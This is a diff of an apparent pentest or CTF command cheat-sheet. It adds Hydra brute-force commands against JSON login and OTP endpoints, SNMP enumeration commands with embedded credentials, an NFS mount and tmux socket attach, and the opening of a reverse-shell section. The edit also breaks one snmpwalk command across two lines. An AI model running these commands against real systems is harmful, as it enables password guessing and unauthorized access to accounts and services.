@@ -512,14 +512,21 @@ mount -o vers=3 -t nfs 10.10.10.10:/home/mark mnt
 [attach tmux socket]
 tmux -S .details attach
 
-[hydra: json]
+[hydra]
 hydra -l admin@e-shopping-cart.com -P wordlistts.txt 192.95.148.3 http-post-form '/validate-otp:{\"email\"\:\"^USER^\",\"password\"\:\"pass\",\"otp\"\:\"^PASS^\"}:Error' -s 8080 -V
 hydra -l admin -P /opt/rockyou.txt management.escobar.hmv http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden' -V -f
+Types:	[http[s]]
+	* http[s]-get
+	* http[s]-get-form
+	* http[s]-post-form
+	[ssh] [pop3] [rdp] [smtp] [ftp] [telnet]
+Reference: https://github.com/gnebbia/hydra_notes
 
 [snmp enumeration]
 snmpwalk -v1 -c public 192.168.68.108
 nmap --script "snmp* and not snmp-brute" -p 161 -sU 192.168.68.108
-snmpwalk -v3 -a SHA -A STrP@SSWRD -x AES -X STr0ngP@SSWRD -l authPriv -u snmpadmin localhost | head
+snmpwalk -v3 -
+a SHA -A STrP@SSWRD -x AES -X STr0ngP@SSWRD -l authPriv -u snmpadmin localhost | head
 
 [udp reverse shell]
 >> listening
